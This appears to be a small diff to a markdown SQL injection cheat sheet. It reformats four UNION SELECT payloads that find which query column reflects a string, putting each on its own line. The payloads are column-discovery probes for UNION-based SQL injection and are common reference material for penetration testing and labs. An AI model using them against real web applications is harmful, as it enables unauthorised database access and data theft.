@@ -69,7 +69,13 @@ Modified:
 
 **Replace 'a' with string you are looking for:**
 
-`' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--`
+`' UNION SELECT 'a',NULL,NULL,NULL-- `
+
+`' UNION SELECT NULL,'a',NULL,NULL-- `
+
+`' UNION SELECT NULL,NULL,'a',NULL-- `
+
+`' UNION SELECT NULL,NULL,NULL,'a'--`
 
 Regular:
 
